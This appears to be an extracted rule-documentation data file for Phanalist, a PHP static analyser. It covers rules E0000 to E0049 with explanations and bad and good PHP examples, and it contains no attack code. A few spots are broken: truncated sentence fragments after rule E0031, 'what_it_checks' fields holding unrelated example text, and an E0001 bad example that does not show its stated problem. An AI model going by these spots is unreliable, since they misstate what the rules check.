rules.title: E0000: Example rule
rules.plain_english: This is the template rule used by the "Adding a new rule" tutorial. It never reports a violation.
rules.why_matters: It shows the smallest complete rule implementation. It is not intended for real analysis.
rules.bad_example:
<?php
// E0000 is a placeholder rule and should not report real issues.
function example(): void {}
rules.good_example:
<?php
// Use a real rule code in configuration and rule docs.
function example(): void {}
what_it_checks: Checks for E0000 violations

rules.title: E0001: Opening tag position
rules.plain_english: The PHP opening tag (`<?php` or `<?=`) should be on the first line of the file, starting at column 1.
rules.why_matters: If there is any whitespace, blank lines, or output before `<?php`, PHP may send headers and output to the browser earlier than expected. This can cause unexpected whitespace in JSON or API responses, "Headers already sent" warnings, or broken redirects and cookies.
rules.bad_example:
<?php
// There is an empty blank line before the opening tag.
echo "Hello World";
rules.good_example:
<?php
declare(strict_types=1);

namespace App;

echo "Hello World";
what_it_checks: The PHP opening tag is on line 1.
The opening tag starts at column 1 (no leading indentation or spaces).
CLI scripts may use a Unix shebang (`#!...`) on line 1 before the opening tag.

rules.title: E0002: Empty catch
rules.plain_english: A `catch` block should not be left empty. Caught exceptions should be handled, logged, or rethrown.
rules.why_matters: Catching an exception and doing nothing with it hides failures such as bugs, failed database queries, or invalid input. When something goes wrong, the application may fail silently or behave unpredictably without leaving useful trace information.
what_it_checks: `try...catch` blocks where the catch body contains no statements.

rules.title: E0003: Method modifiers
rules.plain_english: Methods in classes should declare an explicit visibility modifier: `public`, `protected`, or `private`.
rules.why_matters: Without an explicit modifier, it is less clear whether a method is intended for external use or internal class behavior. Explicit visibility makes the class interface easier to understand and supports encapsulation.
what_it_checks: Class methods that do not declare `public`, `protected`, or `private`.

rules.title: E0004: Uppercase constants
rules.plain_english: Constants should use uppercase letters with underscores, such as `MAX_RETRIES`.
rules.why_matters: PHP constants are immutable values. Using an all-uppercase naming convention makes constants easy to distinguish from variables and other identifiers.
what_it_checks: Global constants defined with `define()`.
Constants defined inside classes, interfaces, traits, and enums.
Whether constant names match their uppercase form.

rules.title: E0005: Capitalized class name
rules.plain_english: Class names should start with an uppercase letter, typically using PascalCase (StudlyCase).
rules.why_matters: PHP naming conventions and PSR-4 autoloading expect class names to start with an uppercase letter. Consistent naming makes class references easier to recognize and keeps code predictable.
what_it_checks: Class declarations.
Whether the first letter of the class name is uppercase.

rules.title: E0006: Property modifiers
rules.plain_english: Class properties should declare an explicit visibility modifier: `public`, `protected`, or `private`.
rules.why_matters: Explicit visibility makes it clear how a property is intended to be used. Using `private` or `protected` can also help protect internal state by limiting direct external access.
what_it_checks: Class properties that do not declare an explicit visibility modifier.

rules.title: E0007: Method parameters count
rules.plain_english: Methods with many parameters can be hard to read, call, and change.
rules.why_matters: A long parameter list often means a method is handling too many responsibilities or missing an abstraction. Reducing parameter count can make the method's purpose clearer and reduce the chance of passing arguments in the wrong order.
rules.bad_example:
<?php

class Maintenance
{
    public function execute(
        Hammer $hammer,
        Screw $screw,
        Screwdriver $screwDriver,
        Nails $nails,
        Paint $paint,
        SandingPaper $sandingPaper,
        Painting $painting,
        Brush $brush,
        Ladder $ladder
    ) {
    }
}
rules.good_example:
<?php

interface Activity
{
    /** @return array<int, object> */
    public function getTools(): array;
}

class Maintenance
{
    public function execute(Activity ...$activities): void
    {
        foreach ($activities as $activity) {
            $tools = $activity->getTools();
            // Use tools.
        }
    }
}

class Paint implements Activity
{
    public function getTools(): array
    {
        return [];
    }
}
what_it_checks: The number of parameters declared by a method.
By default, constructors are included.
The default maximum is 8 parameters.

rules.title: E0008: Return type signature
rules.plain_english: Methods should declare an explicit return type, such as `: int`, `: string`, `: void`, or `: ?User`.
rules.why_matters: Return type declarations make a method's contract clearer. They help readers understand what to expect and allow PHP and static analysis tools to catch type mismatches earlier.
what_it_checks: Method declarations that are missing a return type.

rules.title: E0009: Cyclomatic complexity
rules.plain_english: Cyclomatic complexity measures how many independent execution paths exist through a method.
rules.why_matters: Methods with many branches are harder to read, test, and change safely. A high score usually means the method is making too many decisions in one place.
what_it_checks: Checks for E0009 violations

rules.title: E0010: NPath complexity
rules.plain_english: NPath complexity counts the number of distinct execution paths through a method. Unlike cyclomatic complexity, consecutive branches multiply the number of possible paths.
rules.why_matters: When branches stack on top of each other, the number of possible execution paths can grow quickly. A high NPath score makes a method difficult to reason about and thoroughly test.
what_it_checks: Checks for E0010 violations

rules.title: E0011: Error suppression operator `@`
rules.plain_english: The `@` error control operator suppresses PHP errors and warnings. This rule flags its use.
rules.why_matters: Suppressing errors hides underlying problems, such as failed file reads, undefined indexes, or connection errors. This makes failures harder to detect and debug, especially when issues only appear in production.
what_it_checks: Expressions and return statements that use the error control operator (`@`).

rules.title: E0012: Service compatibility with shared-memory runtimes
rules.plain_english: In long-running PHP runtimes such as RoadRunner, Swoole, or FrankenPHP, service instances can remain in memory across multiple requests. This rule checks for service state mutations that can leak data between requests.
rules.why_matters: Traditional PHP-FPM typically discards request memory after each request. In long-running worker runtimes, the same service instance may handle many requests. If request-specific data is stored on `$this` or in static properties, that state can leak into later requests, causing data corruption or security issues.
what_it_checks: Classes in configured namespaces (by default `App\Service\` and `App\Controller\`).
Assignments to `$this->property` or static properties such as `self::$prop` inside methods, excluding constructors.
Classes that implement a configured reset interface (for example, `ResetInterface`) are allowed.

rules.title: E0013: Private method not being used
rules.plain_english: This rule reports private methods that are declared in a class but never called within that class.
rules.why_matters: Unused private methods are dead code. They add noise, make classes harder to understand, and can leave behind maintenance or testing overhead for logic that is no longer needed.
what_it_checks: Private methods declared in a class.
Method calls inside the class, such as `$this->methodName()`.
Reports private methods that are never referenced in the class.

rules.title: E0014: Law of Demeter
rules.plain_english: The Law of Demeter discourages reaching through one object to access another object's internals. In practice, this rule flags method chains that navigate through unrelated objects.
rules.why_matters: Long call chains like `$a->getB()->getC()->doSomething()` tightly couple code to the structure of multiple objects. Small changes in one class can ripple through callers, making code harder to change and test.
what_it_checks: Method chaining that violates the Law of Demeter.
A method should generally call methods on: `$this`, objects created inside the method, objects passed as parameters, or direct properties of the class.

rules.title: E0015: Lack of Cohesion of Methods (LCOM4)
rules.plain_english: LCOM4 measures whether the methods in a class are connected through shared properties or method calls. A higher score can indicate that a class contains unrelated responsibilities.
rules.why_matters: A class with low cohesion often does more than one job. Splitting it into focused classes can make behavior easier to understand, test, and change.
what_it_checks: Checks for E0015 violations

rules.title: E0016: Cognitive complexity
rules.plain_english: Cognitive complexity estimates how difficult code is to understand by accounting for control flow, nesting, and logical operators.
rules.why_matters: Code that is deeply nested or contains many branching conditions takes more effort to read and maintain. Reducing cognitive complexity usually makes behavior easier to follow and safer to modify.
what_it_checks: Checks for E0016 violations

rules.title: E0017: Coupling Between Objects (CBO)
rules.plain_english: Coupling Between Objects (CBO) counts how many distinct external classes a class depends on.
rules.why_matters: Highly coupled classes are more sensitive to changes elsewhere in the codebase. Reducing coupling can make classes easier to test, reuse, and modify independently.
what_it_checks: Checks for E0017 violations

rules.title: E0018: Weighted Methods per Class (WMC)
rules.plain_english: Weighted Methods per Class (WMC) measures the total complexity of a class by summing the cyclomatic complexity of its methods.
rules.why_matters: Even if individual methods are manageable, a class can still be difficult to maintain when it contains too much total complexity. A high WMC score often indicates that a class has too many responsibilities.
what_it_checks: Method A: 5
Method B: 2
Method C: 15
Total WMC: 22

rules.title: E0019: Response For a Class (RFC)
rules.plain_english: Response For a Class (RFC) measures how many distinct methods can be invoked in response to messages received by a class.
rules.why_matters: A high RFC score means a class interacts with many operations, either in its own methods or through external calls. This can increase the class's complexity and make changes harder to reason about.
what_it_checks: Checks for E0019 violations

rules.title: E0020: Depth of Inheritance Tree (DIT)
rules.plain_english: Depth of Inheritance Tree (DIT) measures how many parent classes a class has in its inheritance chain.
rules.why_matters: Deep inheritance hierarchies can make behavior harder to understand because methods and properties are spread across multiple classes. They also increase the risk that changes in a base class affect many descendants.
what_it_checks: `class Animal {}` — depth 0
`class Dog extends Animal {}` — depth 1
`class Poodle extends Dog {}` — depth 2

rules.title: E0021: Number of Children (NOC)
rules.plain_english: Number of Children (NOC) counts how many classes directly extend a given class.
rules.why_matters: A base class with many direct subclasses can become fragile. Changes to that base class may affect many descendants, increasing the risk of unintended breakage.
what_it_checks: Checks for E0021 violations

rules.title: E0022: Afferent and Efferent Coupling (Ca/Ce)
rules.plain_english: Afferent coupling (Ca) and efferent coupling (Ce) measure how much a namespace depends on other namespaces and how much other namespaces depend on it.
rules.why_matters: - **Ca (incoming coupling):** How many external classes depend on classes in this namespace. High Ca means changes here can affect many other parts of the system. - **Ce (outgoing coupling):** How many external classes this namespace depends on. High Ce means this namespace is more sensitive to changes elsewhere. High coupling in either direction can make code harder to change safely.
what_it_checks: Checks for E0022 violations

rules.title: E0023: Instability, Abstractness, and Distance from Main Sequence
rules.plain_english: Reports namespace-level coupling metrics when they exceed configured thresholds: Instability (I), Abstractness (A), and Distance from Main Sequence (D).
rules.why_matters: These metrics help evaluate whether a namespace has a healthy balance between stability and abstraction. - **Stable, abstract namespaces** (for example, shared interfaces) are easier to depend on safely. - **Unstable, concrete namespaces** (for example, implementation details) are easier to change when few other parts depend on them. - Namespaces far from this balance can be hard to change or provide little practical value.
rules.bad_example:
<?php
namespace App\Service;

class PaymentService
{
    public function __construct(
        private \App\Repository\OrderRepository $orders,
        private \App\Repository\UserRepository $users,
        private \App\Gateway\StripeGateway $stripe,
    ) {}
}
rules.good_example:
<?php
namespace App\Service;

interface PaymentGateway
{
    public function charge(int $amount): void;
}

class PaymentService
{
    public function __construct(private PaymentGateway $gateway) {}
}
what_it_checks: **Instability (I)** = `Ce / (Ca + Ce)`
`Ce` (efferent coupling): number of external types this namespace depends on.
`Ca` (afferent coupling): number of classes outside this namespace that depend on classes in this namespace.
Higher `I` means the namespace depends on many others relative to how many depend on it.
**Abstractness (A)** = `abstract / total`
`abstract`: number of abstract classes and interfaces in the namespace.
`total`: total number of classes in the namespace.
**Distance from Main Sequence (D)** = `|A + I - 1|`
Lower values are closer to the ideal balance.
`E0023:instability` when `I > max_instability` and `Ca + Ce > 0`.
`E0023:abstractness` when `A > max_abstractness` and `total > 0`.
`E0023:distance` when `D > max_distance` and both instability and abstractness are computable.

rules.title: E0024: Lines of Code per Method
rules.plain_english: Reports concrete methods whose body exceeds the configured line-count threshold.
rules.why_matters: Long methods are harder to read, test, and change safely. Splitting a method into smaller, focused methods usually makes behavior easier to understand and reuse.
what_it_checks: Concrete method bodies in classes, traits, and enums.
Lines of code are counted as `end_line - start_line - 1` for the method body.
A method is reported when its LOC is greater than `max_loc`.

rules.title: E0025: Lines of Code per File
rules.plain_english: Reports files that exceed the configured total line-count threshold.
rules.why_matters: Very large files are harder to navigate and often contain too many responsibilities. Smaller files with clear boundaries are usually easier to review and maintain.
rules.bad_example:
<?php

namespace App;

class OrderManager
{
    // 300 lines of order logic...
    // 200 lines of billing logic...
    // 150 lines of shipping logic...
}
rules.good_example:
<?php

namespace App;

class OrderProcessor
{
    // ~50 lines
}
what_it_checks: Applies to files containing a class, trait, enum, or interface declaration.
Counts every line in the file (`file.lines.len()`).
Reports when the total line count is greater than `max_loc`.

rules.title: E0026: Comment Ratio
rules.plain_english: Reports classes whose comment ratio is below the configured minimum or above the configured maximum.
rules.why_matters: Comments can provide useful context, but too few or too many can both be signals of maintenance problems. Very low comment coverage may leave intent unclear; very high comment coverage can indicate code that is hard to follow.
what_it_checks: Applies to class declarations.
Scans raw file lines and classifies them as code, comment, or blank.
Calculates ratio as `comment_lines / (code_lines + comment_lines)`.
Reports `E0026:undercommented` when ratio is below `min_ratio`.
Reports `E0026:overcommented` when ratio is above `max_ratio`.

rules.title: E0027: God Class
rules.plain_english: Reports classes, traits, or enums that have too many methods and too many fields, which can indicate a God Class.
rules.why_matters: A type with many responsibilities is harder to understand, test, and change safely. Splitting it into focused types usually reduces coupling and makes behavior easier to maintain.
what_it_checks: Counts methods and properties in classes, traits, and enums.
Reports when **both** thresholds are exceeded:
`method_count > max_methods`
`field_count > max_fields`

rules.title: E0028: Data Class
rules.plain_english: Reports classes, traits, or enums that primarily expose data through getters/setters with little or no behavior.
rules.why_matters: A data-only class can push behavior into other parts of the codebase, making related logic scattered and harder to maintain. Adding meaningful behavior can improve encapsulation and clarity.
what_it_checks: Counts fields and methods in classes, traits, and enums.
Classifies accessor methods (`get*`, `is*`/`has*`, `set*`) using naming and simple body rules.
Ignores classes with no fields or fewer than `min_methods` methods.
Reports `E0028:data-class` when all non-constructor, non-accessor behavior is absent.
Reports `E0028:potential-data-class` when accessor ratio is >= `max_getter_setter_ratio`.

rules.title: E0029: Class Fan-in and Fan-out
rules.plain_english: Reports classes whose fan-out or fan-in exceeds configured thresholds.
rules.why_matters: - **High fan-out** means a class depends on many other classes, making it more fragile and harder to change. - **High fan-in** means many classes depend on this class, so changes can have wide impact and require careful testing.
what_it_checks: **Fan-out**: number of distinct classes a class depends on.
**Fan-in**: number of other classes that depend on this class.
Dependencies are collected from type hints, `new` instantiations, `instanceof` checks, static method calls, and property/constant access.
Reports `E0029:fan-out` when fan-out exceeds `max_fan_out`.
Reports `E0029:fan-in` when fan-in exceeds `max_fan_in`.

rules.title: E0030: Cyclomatic Complexity Density
rules.plain_english: Reports methods where decision-making logic is densely packed into a small number of lines.
rules.why_matters: Cyclomatic complexity density measures how much branching occurs per line of code. A short method can still be difficult to understand if most lines contain decisions.
what_it_checks: Applies to concrete methods in classes, traits, and enums.
Computes `density = (1 + total_branches) / body_lines`.
Branches include `if`, `elseif`, `case`, `catch`, and loops (`for`, `foreach`, `while`, `do-while`).
Reports when density is greater than `max_density`.

rules.title: E0031: Division by Zero
rules.plain_english: Reports division operations where the divisor can be zero.
rules.why_matters: Division by zero causes runtime errors. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to find feasible paths where a divisor can be zero and provide a solver-backed counterexample. This rule is part of the verification family E0031-E0043. Proofs are relative to the modeled subset, configured checks, and project interprocedural summaries. A clean result means no violation was found in that model; it does not prove every possible PHP execution is safe.
rules.bad_example:
<?php
function average(int $total, int $count): float
{
    return $total / $count; // $count can be 0
}
rules.good_example:
<?php
function average(int $total, int $count): float
{
    if ($count === 0) {
        return 0.0;
    }

    return $total / $count;
}

Heap, object-state, reference, and alias invariants beyond the supported
Arbitrary loop invariants. Loops are unrolled to a configured bound; this finds
Arbitrary relationships between the lengths of different arrays. A key from
Concurrency and persistent-runtime behavior such as Swoole, RoadRunner, or
Builtin behavior whose result shape depends on an unmodeled flag. For example,
Business, authorization, or security intent. Those properties need to be
Properties whose values remain `Unknown` or unverified. With

rules.title: E0032: Modulo by Zero
rules.plain_english: Reports modulo operations where the right operand can be zero.
rules.why_matters: Modulo by zero causes runtime errors. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to find feasible paths where the divisor can be zero and provide a solver-backed counterexample.
rules.bad_example:
<?php
function bucket(int $id, int $size): int
{
    return $id % $size; // $size can be 0
}
rules.good_example:
<?php
function bucket(int $id, int $size): int
{
    if ($size === 0) {
        throw new InvalidArgumentException('Size must be non-zero');
    }

    return $id % $size;
}
what_it_checks: `%` and `%=` where the divisor can be zero
Literal zero, symbolic zero, and zero reached through tracked arrays or expressions
Guarded modulo, including `if`, `switch`, `match`, short-circuit `&&`, and `try`/`catch`/`finally` paths
Loop exit values merged with the feasible zero-iteration path
Constant-return, identity, and PHPDoc method/function summaries

rules.title: E0033: intdiv() by Zero
rules.plain_english: Reports `intdiv()` calls where the divisor can be zero.
rules.why_matters: `intdiv()` throws a `DivisionByZeroError` when its divisor is zero. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to find feasible paths where that can happen.
rules.bad_example:
<?php
function split(int $total, int $parts): int
{
    return intdiv($total, $parts); // $parts can be 0
}
rules.good_example:
<?php
function split(int $total, int $parts): int
{
    if ($parts === 0) {
        throw new InvalidArgumentException('Parts must be non-zero');
    }

    return intdiv($total, $parts);
}
what_it_checks: `intdiv($value, 0)` and `intdiv($value, $divisor)` where `$divisor` can be zero
Symbolic divisors, tracked array elements, and bounded integer ranges
Guarded calls, including `if`, `switch`, `match`, short-circuit `&&`, and `try`/`catch`/`finally` paths
Constant-return, identity, and PHPDoc method/function summaries

rules.title: E0034: intdiv() Overflow
rules.plain_english: Reports `intdiv()` calls that can overflow for `PHP_INT_MIN / -1`.
rules.why_matters: `intdiv(PHP_INT_MIN, -1)` overflows integer arithmetic in PHP and causes a runtime error. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible paths that reach this case.
rules.bad_example:
<?php
function overflow(): int
{
    return intdiv(PHP_INT_MIN, -1); // overflow
}
rules.good_example:
<?php
function safeIntDiv(int $a, int $b): int
{
    if ($b === 0) {
        throw new InvalidArgumentException('Division by zero');
    }
    if ($a === PHP_INT_MIN && $b === -1) {
        throw new InvalidArgumentException('Overflow');
    }

    return intdiv($a, $b);
}
what_it_checks: `intdiv(PHP_INT_MIN, -1)` and equivalent constant expressions
Symbolic dividends and divisors whose feasible values reach the overflow case
Guarded calls and bounded integer ranges
Constant-return, identity, and PHPDoc method/function summaries

rules.title: E0035: Missing Array Key
rules.plain_english: Reports reads of keys that are missing from tracked literal arrays.
rules.why_matters: Accessing a missing array key can produce warnings/notices and lead to unexpected `null` values. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to find feasible paths where a key read is missing.
rules.bad_example:
<?php
/** @param array{name: string} $user */
function greet(array $user): string
{
    return $user['email']; // key may be missing
}
rules.good_example:
<?php
/** @param array{name: string, email?: string} $user */
function greet(array $user): string
{
    $email = $user['email'] ?? 'unknown';

    return $email;
}
what_it_checks: Missing string and integer keys in tracked literal arrays
Keys returned by `array_key_first()` and `array_key_last()` for tracked literal arrays, preserving PHP insertion order
Nested literal array shapes
Reads guarded by `isset()` and `??`
Arrays forgotten after writes through untracked paths or by-reference calls
Keys checked through bounded branches and short-circuit conditions

rules.title: E0036: Array Index Out of Bounds
rules.plain_english: Reports array indexes that can be out of bounds.
rules.why_matters: Out-of-bounds array access can produce warnings and unexpected behavior. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible paths where an index is outside the valid range.
rules.bad_example:
<?php
function firstItem(array $items): mixed
{
    return $items[0]; // array may be empty
}
rules.good_example:
<?php
function firstItem(array $items): mixed
{
    if ($items === []) {
        return null;
    }

    return $items[0];
}
what_it_checks: Negative and out-of-bounds array indexes
PHPDoc `list<T>` and `non-empty-list<T>` values, including `count()`/`sizeof()` lengths, appends, `foreach` keys, and `isset()` guards
First and last keys from `array_key_first()` and `array_key_last()` on tracked literal arrays, preserving PHP insertion order
Derived list lengths from `array_merge()` on list inputs and lengths preserved by `array_map()`, `array_values()`, and `array_reverse()`
Generic `array<K,V>` lengths, including lengths returned through PHPDoc contracts

Upper bounds from `array_diff()`, `array_intersect()`, `array_unique()`, `array_filter()`, and `array_fill_keys()`; exact lengths from `array_keys()`; count-derived lengths from `array_fill()`; padded lengths from `array_pad()`; PHP-compatible offset and length rules for `array_slice()`; and chunk counts from `array_chunk()`
The longest input length for multi-array `array_map()`
Guards in short-circuited `&&` chains
Reachable symbolic indexes that can be out of bounds; indexes that cannot be modeled report `unverified` under `unknown_policy: report`
Literal accesses that are merely uncertain are not reported as hard out-of-bounds findings

rules.title: E0037: String Offset Out of Bounds
rules.plain_english: Reports string offsets that can be out of bounds.
rules.why_matters: Accessing a string offset outside its valid range can produce warnings and unexpected values. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible out-of-bounds string accesses.
rules.bad_example:
<?php
function lastChar(string $s): string
{
    return $s[strlen($s)]; // off by one
}
rules.good_example:
<?php
function lastChar(string $s): string
{
    if ($s === '') {
        return '';
    }

    return $s[strlen($s) - 1];
}
what_it_checks: Negative and out-of-bounds string offsets
Literal strings and documented `non-empty-string` values

Lengths derived from `strlen()`, `str_repeat()` with a literal repetition count, `substr()` using PHP's offset and length rules, `str_split()` using a literal chunk size, and `str_pad()` with a literal non-empty pad string
Symbolic offsets and guards in branches and short-circuit conditions
Offsets that cannot be modeled report `unverified` under `unknown_policy: report`

rules.title: E0038: Method Call on Null
rules.plain_english: Reports method calls on values that can be null.
rules.why_matters: Calling a method on `null` causes a fatal runtime error. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible paths where the receiver can be null.
rules.bad_example:
<?php
function name(?User $user): string
{
    return $user->getName(); // $user may be null
}
rules.good_example:
<?php
function name(?User $user): string
{
    if ($user === null) {
        return 'guest';
    }

    return $user->getName();
}
what_it_checks: Method calls on null and nullable values
Nullness narrowed by `if`, `switch`, `match`, `isset()`, and short-circuit conditions
Nullsafe calls (`?->`) are treated as safe
PHPDoc parameter, `@var`, and return contracts
Constant-return, identity, and method summaries

rules.title: E0039: Property Access on Null
rules.plain_english: Reports property reads on values that can be null.
rules.why_matters: Reading a property on `null` causes a fatal runtime error. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible paths where the receiver can be null.
rules.bad_example:
<?php
function id(?User $user): int
{
    return $user->id; // $user may be null
}
rules.good_example:
<?php
function id(?User $user): int
{
    if ($user === null) {
        return 0;
    }

    return $user->id;
}
what_it_checks: Property reads on null and nullable values
Nullness narrowed by `if`, `switch`, `match`, `isset()`, and short-circuit conditions
Nullsafe property access (`?->`) is treated as safe
PHPDoc parameter, `@var`, and return contracts
Constant-return, identity, and method summaries

rules.title: E0040: Return Contract Violation
rules.plain_english: Reports return values that contradict a declared return contract.
rules.why_matters: A return value that violates a native type or PHPDoc `@return` contract can cause runtime type errors or break callers that rely on the documented contract. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible violating paths.
rules.bad_example:
<?php
/** @return int */
function countItems(array $items): int
{
    return $items; // wrong return type
}
rules.good_example:
<?php
/** @return int */
function countItems(array $items): int
{
    return count($items);
}
what_it_checks: Native return types and PHPDoc `@return` contracts
Missing return values on paths that must return a value
`never` contracts that make following code unreachable
Strict and weak PHP return coercion rules
Numeric, string, list, non-empty, and shaped array contracts
Generator returns are not checked against the generator return type

rules.title: E0041: Unreachable Code
rules.plain_english: Reports statements that cannot be reached.
rules.why_matters: Unreachable code often indicates a logic error, dead branch, or leftover code after a control-flow change. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to identify statements that cannot be executed on feasible paths.
rules.bad_example:
<?php
function f(): int
{
    return 1;
    echo "never"; // unreachable
}
rules.good_example:
<?php
function f(): int
{
    echo "before return";
    return 1;
}
what_it_checks: Statements after `return`, `break`, `continue`, `throw`, or `exit`
Numbered `break` and `continue` levels
`continue` inside `switch`
Unreachable statements after `never`-returning calls
Conditional throws and exits that only make one branch unreachable
Statements after exhaustive `switch` or `match` constructs

rules.title: E0042: Impossible Assertion
rules.plain_english: Reports assertions that can never hold on any feasible path.
rules.why_matters: An assertion that is always false indicates contradictory logic, an incorrect assumption, or a bug in the surrounding control flow. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect provably impossible assertions.
rules.bad_example:
<?php
function f(int $i): void
{
    assert($i > 0 && $i < 0); // impossible
}
rules.good_example:
<?php
function f(int $i): void
{
    assert($i >= 0);
}
what_it_checks: Assertions whose condition is unsatisfiable on every feasible path
Assertions narrowed by earlier branches, `isset()`, and short-circuit conditions
`assert()` calls with modelable boolean conditions
Unknown assertion conditions are treated as assumptions, not failures

rules.title: E0043: Stream Resource Used After Close
rules.plain_english: Reports stream resources that are read, written, or closed after they have already been closed.
rules.why_matters: Using a closed stream can cause runtime warnings/errors and indicates incorrect resource lifecycle management. This rule uses Phanalist's bounded formal verification engine (Z3-backed) to detect feasible use-after-close paths.
rules.bad_example:
<?php
function readFile(string $path): string
{
    $h = fopen($path, 'r');
    fclose($h);
    return fread($h, 100); // used after close
}
rules.good_example:
<?php
function readFile(string $path): string
{
    $h = fopen($path, 'r');
    if ($h === false) {
        return '';
    }
    $data = fread($h, 100);
    fclose($h);

    return $data === false ? '' : $data;
}
what_it_checks: `fread()` or `fwrite()` on a stream that was closed on every feasible path
`fread()` or `fwrite()` on a stream that may have been closed on another path
`fclose()` on a stream that was already closed, or may already have been closed
Direct aliases created with `$alias = $stream`, because both names refer to the same tracked resource
Branch and loop joins where one path closes the stream and another leaves it open; these produce a "may have been closed" finding
Reopening a variable with another direct `fopen()` resets its lifecycle state

rules.title: E0044: Input-Dependent Runtime Growth
rules.plain_english: Reports loops whose work grows faster than the configured runtime threshold as an input-sized collection grows.
rules.why_matters: Runtime cost that grows superlinearly with input size can cause slow requests, timeouts, or denial-of-service risks when input is large or attacker-controlled. E0044 is part of Phanalist's resource-analysis rules (E0044-E0046), which model allocation, retention, and input cardinality separately from bounded verification rules.
rules.bad_example:
<?php
function hasDuplicates(array $items): bool
{
    foreach ($items as $a) {
        foreach ($items as $b) {
            if ($a === $b) { return true; }
        }
    }
    return false;
}
rules.good_example:
<?php
function hasDuplicates(array $items): bool
{
    $seen = [];
    foreach ($items as $item) {
        if (isset($seen[$item])) {
            return true;
        }
        $seen[$item] = true;
    }
    return false;
}
what_it_checks: Nested loops over the same input-sized collection
Loops that repeatedly perform linear work such as `array_unshift()`, `array_merge()`, `in_array()`, `array_search()`, `preg_match()`, or repeated array copying
Linear work inside a loop that is already linear in the same size measure
Loops whose bound is an unguarded input cardinality, reported together with E0046
Calls to local functions or methods whose resource summary makes the enclosing loop superlinear

rules.title: E0045: Input-Dependent Live-Heap Growth
rules.plain_english: Reports loops that retain memory in proportion to an input-sized collection.
rules.why_matters: Allocating temporary values is not the same as keeping them reachable. E0045 focuses on live heap growth: memory that remains reachable and can accumulate as input size grows, which can increase memory pressure in long-running requests or workers.
rules.bad_example:
<?php
function build(array $items): array
{
    $result = [];
    foreach ($items as $item) {
        $result[] = $items; // grows with input
    }
    return $result;
}
rules.good_example:
<?php
function build(array $items): array
{
    $result = [];
    foreach ($items as $item) {
        $result[] = $item;
    }
    return $result;
}
what_it_checks: Appending input-sized values to an array that remains reachable
Building a new local array with dynamic indexes, then returning or otherwise retaining it
Retaining input-sized arrays, objects, or strings in another array or property
Repeated copying growth such as `array_unshift()`, where cumulative allocation is quadratic even when the final array is linear
Accumulating values across loop iterations without a corresponding release
Escaping values whose size is controlled by request input
Calls to local functions or methods whose resource summary allocates or retains input-sized data

rules.title: E0046: Input-Controlled Cardinality
rules.plain_english: This rule reports request-controlled values that reach loops, allocation sinks, or callees without a bound. Cardinality is separate from taint: a value may be tainted without controlling collection size, and an input-controlled collection may contain ordinary strings.
rules.why_matters: When user input controls how many times code loops or how much memory is allocated, a large or unexpected value can cause excessive CPU use, memory growth, or denial of service. Adding an explicit bound or validation step makes the cost predictable.
rules.bad_example:
<?php
function loadAll(PDO $db): array
{
    return $db->query('SELECT * FROM users')->fetchAll(); // unbounded
}
rules.good_example:
<?php
function loadPage(PDO $db, int $limit, int $offset): array
{
    $stmt = $db->prepare('SELECT * FROM users LIMIT ? OFFSET ?');
    $stmt->execute([$limit, $offset]);
    return $stmt->fetchAll();
}
what_it_checks: Superglobals `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, and `$_FILES`
Request-relevant `$_SERVER` keys such as `HTTP_*`, `REQUEST_*`, `PHP_AUTH_*`, `QUERY_STRING`, and `PATH_INFO`; iterating the whole `$_SERVER` array is treated as server metadata
`$argv` when `include_cli_input` is enabled
Results of `filter_input()`, `apache_request_headers()`, and `getallheaders()`
`readline()` when `include_cli_input` is enabled
`file_get_contents('php://input')`
Heuristic request accessors named `input`, `query`, `post`, `get`, `all`, `json`, `file`, `cookie`, `header`, or `param`
Request-controlled values used as loop bounds
Request-controlled values passed to allocation sinks such as `str_repeat()`, `range()`, `array_fill()`, `array_pad()`, `str_split()`, `explode()`, and `preg_split()`
Request-controlled arguments passed to local functions or methods whose resource summary iterates or allocates in proportion to that argument

rules.title: E0047: Resource lifecycle leak
rules.plain_english: This rule reports function-scoped resources that are opened and never closed or transferred to another owner. It complements E0043, which reports use-after-close and double-close on tracked streams.
rules.why_matters: Leaving file handles, pipes, process handles, or directory handles open can exhaust system resources, especially in long-running workers or code paths that run many times. Closing resources explicitly, or transferring ownership clearly, makes resource lifetimes easier to reason about.
rules.bad_example:
<?php
function write(string $path, string $data): void
{
    $h = fopen($path, 'w');
    fwrite($h, $data);
    // missing fclose($h)
}
rules.good_example:
<?php
function write(string $path, string $data): void
{
    $h = fopen($path, 'w');
    if ($h === false) {
        return;
    }
    try {
        fwrite($h, $data);
    } finally {
        fclose($h);
    }
}
what_it_checks: `fopen()`, `fsockopen()`, `pfsockopen()`, `stream_socket_client()`, and `tmpfile()` handles that should be closed with `fclose()`
`popen()` handles that should be closed with `pclose()`
`proc_open()` handles that should be closed with `proc_close()`
`opendir()` handles that should be closed with `closedir()`

rules.title: E0048: Unbounded direct recursion
rules.plain_english: This rule reports direct recursion that reuses unchanged arguments and does not reassign the corresponding parameters. These calls are strong candidates for infinite recursion.
rules.why_matters: A recursive call that keeps the same inputs can repeat forever, leading to stack exhaustion or a process crash. Making the termination condition and the changing argument explicit helps ensure the recursion makes progress.
rules.bad_example:
<?php
function walk(Node $node): void
{
    walk($node->next); // no base case/guard
}
rules.good_example:
<?php
function walk(?Node $node): void
{
    if ($node === null) {
        return;
    }

    walk($node->next);
}
what_it_checks: A function calling itself with the same parameter variables
A method calling `$this->sameMethod()` with the same parameter variables
A static method calling `self::sameMethod()`, `static::sameMethod()`, or `ClassName::sameMethod()` with the same parameter variables
Zero-argument functions and methods that call themselves

rules.title: E0049: Invalid builtin argument
rules.plain_english: This rule reports builtin calls whose literal arguments are invalid and would make PHP throw a `ValueError` at runtime.
rules.why_matters: These argument errors fail at runtime, often on a specific code path. Catching them statically avoids avoidable crashes and makes the intended input constraints explicit.
rules.bad_example:
<?php
function bad(array $items): array
{
    return array_chunk($items, 0); // invalid size
}
rules.good_example:
<?php
function good(array $items): array
{
    return array_chunk($items, 2);
}
